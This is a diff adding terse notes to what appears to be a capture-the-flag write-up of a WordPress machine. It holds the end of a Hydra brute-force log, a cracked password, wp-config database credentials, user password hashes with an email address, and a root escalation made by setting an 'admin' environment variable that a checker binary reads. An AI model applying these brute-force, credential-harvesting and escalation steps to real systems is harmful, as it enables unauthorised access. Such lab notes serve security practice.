@@ -49,3 +49,29 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-29 14:10:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-29 14:20:51
 ```
 cutiepie1
+
+
+bjoel
+
+/usr/sbin/checker
+
+define('DB_NAME', 'blog');
+
+/** MySQL database username */
+define('DB_USER', 'wordpressuser');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'LittleYellowLamp90!@');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+
+
+1 | bjoel      | $P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/ | bjoel         | nconkl1@outlook.com          |          | 2020-05-26 03:52:26 |                     |           0 | Billy Joel    |
+|  3 | kwheel     | $P$BedNwvQ29vr1TPd80CDl6WnHyjr8te. | kwheel
+
+$P$B3vZ6q67nv8xI1idVRLUxQw/qDdGXc.
+
+with ltrace /usr/sbin/checker, we see a getenv('admin')
+we set a env admin variable : export admin=1
+we launch the binary checker and wooo we're root
